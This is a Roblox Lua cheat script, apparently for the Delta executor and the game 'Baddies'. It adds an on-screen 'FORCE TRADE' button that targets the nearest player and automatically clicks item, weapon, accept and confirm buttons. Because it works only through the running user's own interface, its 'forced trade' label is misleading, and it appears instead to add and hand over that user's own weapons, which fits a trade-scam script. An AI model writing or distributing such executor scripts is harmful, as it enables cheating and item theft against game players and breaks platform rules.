local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local function getNearestPlayer()
	if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
		return nil
	end
	local nearestPlayer = nil
	local nearestDistance = math.huge
	for _, player in pairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local distance = (player.Character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
			if distance < nearestDistance then
				nearestDistance = distance
				nearestPlayer = player
			end
		end
	end
	return nearestPlayer
end

local function findPlayerInGui(targetPlayer)
	for _, obj in pairs(PlayerGui:GetDescendants()) do
		if (obj:IsA("GuiButton") or obj:IsA("TextLabel")) and obj.Text:match(targetPlayer.Name) then
			return obj
		end
	end
	return nil
end

local function addAllWeapons()
	for _, obj in pairs(PlayerGui:GetDescendants()) do
		if obj:IsA("GuiButton") and (obj.Name:match("[Ii]tem") or obj.Name:match("[Ww]eapon")) then
			obj:Activate()
			task.wait(0.1)
		end
	end
end

local function acceptTrade()
	task.wait(0.5)
	for _, obj in pairs(PlayerGui:GetDescendants()) do
		if obj:IsA("GuiButton") then
			local name = obj.Name:lower()
			local text = obj.Text:lower()
			if name:match("accept") or name:match("confirm") or text:match("accept") or text:match("confirm") then
				obj:Activate()
				break
			end
		end
	end
end

local function forcedTrade(targetPlayer)
	if not targetPlayer or targetPlayer == LocalPlayer then return false end
	local playerBtn = findPlayerInGui(targetPlayer)
	if playerBtn then
		playerBtn:Activate()
		task.wait(0.5)
		addAllWeapons()
		task.wait(0.3)
		acceptTrade()
		return true
	end
	return false
end

-- Create on-screen button
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ForcedTradeGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = PlayerGui

local button = Instance.new("TextButton")
button.Name = "ForcedTradeButton"
button.Size = UDim2.new(0, 120, 0, 50)
button.Position = UDim2.new(0.5, -60, 0, 10)
button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
button.BackgroundTransparency = 0.2
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextSize = 18
button.Font = Enum.Font.GothamBold
button.Text = "FORCE TRADE"
button.BorderSizePixel = 0
button.Parent = screenGui

-- Button click function
button.MouseButton1Click:Connect(function()
	local target = getNearestPlayer()
	if target then
		button.Text = "TRADING..."
		button.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
		forcedTrade(target)
		task.wait(2)
		button.Text = "FORCE TRADE"
		button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	else
		button.Text = "NO PLAYERS"
		button.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
		task.wait(2)
		button.Text = "FORCE TRADE"
		button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	end
end)

_G.ForcedTrade = forcedTrade
_G.GetNearestPlayer = getNearestPlayer
print("✅ Delta Baddies Forced Trade Loaded - Press the button at the top!")
